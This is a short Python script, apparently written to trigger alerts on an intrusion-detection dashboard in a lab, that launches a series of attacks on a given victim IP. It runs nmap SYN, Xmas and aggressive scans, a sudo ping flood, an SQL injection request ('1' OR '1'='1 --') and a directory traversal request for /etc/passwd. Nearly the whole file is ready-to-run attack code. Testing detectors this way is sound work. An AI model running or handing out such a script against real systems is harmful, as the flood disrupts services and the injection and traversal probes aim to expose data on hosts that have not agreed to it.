# demo_attacks.py — SIMPLE & 100% WORKING
import os
import sys
import time
import requests  # ← ADD THIS

if len(sys.argv) != 2:
    print("Usage: python3 demo_attacks.py <Victim IP>")
    sys.exit(1)

target = sys.argv[1]

print(f"\nStarting demo attacks on {target}...\n")
time.sleep(2)

# 1. SYN Scan
print("1. SYN Scan")
os.system(f"nmap -sS {target} -Pn --top-ports 100")

# 2. Xmas Scan
print("2. Xmas Scan")
os.system(f"nmap -sX {target} -Pn --top-ports 50")

# 3. Aggressive Scan
print("3. Aggressive scan")
os.system(f"nmap -A {target} -Pn -p 22,80,443,445")

# 4. ICMP Flood
print("4. ICMP Flood")
os.system(f"sudo ping -f -c 1000 {target} > /dev/null 2>&1 & sleep 5; sudo pkill -9 ping")

# 5. SQL Injection — NOW WORKS
print("5. SQL Injection attack")
try:
    requests.get(f"http://{target}/", params={"id": "1' OR '1'='1 --"}, timeout=5)
    print("→ Payload sent: 1' OR '1'='1 --")
except:
    print("SQLi failed (check Apache)")

# 6. LFI
print("6. Directory Traversal attack")
try:
    requests.get(f"http://{target}/../../../../etc/passwd", timeout=5)
    print("→ Payload sent: ../../../../etc/passwd")
except:
    print("LFI failed")

print("\nAll attacks done — check dashboard for [NET], ANOMALY, [L7] alerts!")
